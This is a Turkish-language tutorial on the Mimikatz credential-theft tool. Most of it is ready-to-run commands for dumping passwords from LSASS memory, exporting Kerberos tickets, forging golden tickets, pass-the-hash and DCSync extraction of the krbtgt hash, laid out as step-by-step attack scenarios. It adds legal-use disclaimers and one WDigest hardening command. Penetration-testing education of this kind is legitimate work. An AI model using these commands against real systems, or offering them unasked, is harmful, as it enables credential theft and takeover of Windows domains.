# Mimikatz Kullanım Rehberi

## Mimikatz Nedir?

Mimikatz, güvenlik araştırmacısı **Benjamin Delpy** tarafından geliştirilen açık kaynaklı bir araçtır. Temel olarak, Windows işletim sistemlerinde kimlik bilgileri ve parolalar gibi kritik bilgileri çıkarmak için kullanılır. Mimikatz, hem saldırganlar hem de güvenlik profesyonelleri tarafından yaygın olarak kullanılmaktadır.

> **Önemli Not:** Mimikatz yasal olarak yalnızca test laboratuvarlarında veya sahibinin izni olan sistemlerde kullanılmalıdır. Aksi takdirde yasa dışıdır ve etik dışı sonuçlara yol açabilir.

---

## Ana Özellikleri

1. **LSASS (Local Security Authority Subsystem Service) belleğinden parolaları çıkarma**
2. **Kerberos biletlerini okuma, kaydetme ve manipüle etme**
3. **Altın Bilet (Golden Ticket) ve Gümüş Bilet (Silver Ticket) oluşturma**
4. **Pass-The-Hash saldırıları**
5. **Credential Dumping**
6. **SSP (Security Support Provider) oturum açma bilgilerini görüntüleme**
7. **Komut satırı tabanlı çalıştırma ve betik yazımı**

---

## İndirme ve Çalıştırma

Mimikatz, GitHub üzerinden indirilebilir:

- [https://github.com/gentilkiwi/mimikatz](https://github.com/gentilkiwi/mimikatz)

### Çalıştırma Adımları

1. **İndir ve Ayıkla:**
   ```bash
   git clone https://github.com/gentilkiwi/mimikatz.git
   cd mimikatz/Win32
   ```
2. **Çalıştır:**
   Windows üzerinde PowerShell veya CMD kullanarak Mimikatz çalıştırabilirsiniz:
   ```cmd
   mimikatz.exe
   ```

---

## Kullanım Parametreleri

Aşağıda Mimikatz'ın en yaygın kullanılan modülleri ve parametreleri açıklanmıştır.

### 1. **`privilege::debug`**
- Yüksek ayrıcalıkların gerekli olduğu işlemler için kullanılır.

  ```cmd
  privilege::debug
  ```
  Bu komut, Mimikatz'ı sistem üzerinde daha fazla ayrıcalıkla çalıştırır.

### 2. **`sekurlsa::logonpasswords`**
- LSASS belleğindeki oturum bilgilerini görüntüler.

  ```cmd
  sekurlsa::logonpasswords
  ```
  **Not:** Yalnızca `Administrator` yetkileriyle çalışır.

### 3. **`sekurlsa::wdigest`**
- WDigest protokolüyle oturum açma bilgilerinin düz metin parolalarını görüntüler.

  ```cmd
  sekurlsa::wdigest
  ```

### 4. **`kerberos::list`**
- Kerberos biletlerini görüntüler.

  ```cmd
  kerberos::list /export
  ```
  **Not:** Bu komut ile Kerberos biletlerini dışa aktarabilirsiniz.

### 5. **`kerberos::golden`**
- Altın Bilet oluşturur. Bu bilet, Active Directory ortamlarında sınırsız erişim sağlar.

  ```cmd
  kerberos::golden /user:<username> /domain:<domainname> /sid:<domain_SID> /krbtgt:<krbtgt_hash> /id:<RID>
  ```

  **Parametreler:**
  - `user`: Kullanıcı adı
  - `domain`: Domain adı (örn: example.com)
  - `sid`: Domain'in SID değeri
  - `krbtgt`: Kerberos Ticket Granting Ticket hash değeri
  - `id`: Kullanıcının RID değeri (ör: 500 admin için)

### 6. **`sekurlsa::pth`**
- Pass-the-Hash saldırısı için kullanılır.

  ```cmd
  sekurlsa::pth /user:<username> /domain:<domainname> /ntlm:<hash> /run:<command>
  ```

  **Parametreler:**
  - `user`: Kullanıcı adı
  - `domain`: Domain adı
  - `ntlm`: NTLM hash değeri
  - `run`: Çalıştırılacak komut (ör: cmd.exe)

### 7. **`token::list`**
- Sistem üzerindeki tokenları listeler.

  ```cmd
  token::list
  ```

### 8. **`lsadump::dcsync`**
- Domain Controller'daki kimlik bilgilerini döker. Bu yöntem ile `NTLM` ve `Kerberos` hash bilgilerini çekebilirsiniz.

  ```cmd
  lsadump::dcsync /user:<username>
  ```

  **Örnek:**
  ```cmd
  lsadump::dcsync /user:krbtgt
  ```

### 9. **`misc::cmd`**
- Sistem üzerinde bir komut çalıştırır.

  ```cmd
  misc::cmd
  ```

### 10. **`exit`**
- Mimikatz oturumundan çıkış yapar.

  ```cmd
  exit
  ```

---

## Örnek Kullanım Senaryoları

### 1. WDigest ile Parola Çıkarma
```cmd
privilege::debug
sekurlsa::wdigest
```

### 2. Pass-the-Hash Kullanımı
```cmd
sekurlsa::pth /user:Administrator /domain:example.com /ntlm:<hash> /run:cmd.exe
```

### 3. Altın Bilet Oluşturma
```cmd
kerberos::golden /user:Administrator /domain:example.com /sid:S-1-5-21-1234567890 /krbtgt:<krbtgt_hash> /id:500
```

### 4. LSASS Belleğini Okuma
```cmd
privilege::debug
sekurlsa::logonpasswords
```

---

## Güvenlik ve Önlemler

- LSASS belleğinin okunmasını önlemek için **WDigest** devre dışı bırakılmalıdır:
  ```cmd
  reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f
  ```

- Anti-Virus ve Endpoint Detection and Response (EDR) araçları Mimikatz'ı algılayabilir. Ancak bu tür araçlar test ortamlarında devre dışı bırakılabilir.

---

## Kaynaklar

- [Resmi GitHub Sayfası](https://github.com/gentilkiwi/mimikatz)
- [Benjamin Delpy Twitter](https://twitter.com/gentilkiwi)

---

> **Uyarı:** Bu rehber, yalnızca eğitim ve araştırma amaçlıdır. Yetkisiz kullanımlar yasa dışıdır.
